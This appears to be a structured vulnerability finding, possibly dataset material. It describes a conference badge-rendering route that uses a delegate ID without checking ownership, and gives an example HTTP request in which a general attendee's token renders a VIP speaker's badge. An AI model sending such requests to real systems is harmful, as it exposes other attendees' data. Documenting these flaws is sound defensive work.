diagnosis: The conference badge generation route executes a badge-rendering script using req.params.delegateId without checking whether the authenticated user owns the delegate registration. Any user can generate and download conference badges for other attendees.
exploit_request:
POST /api/events/delegates/del_vip_speaker_4901/render-badge HTTP/1.1
Host: events.summit.internal:3388
Authorization: Bearer <general_attendee_jwt>
Accept: application/json
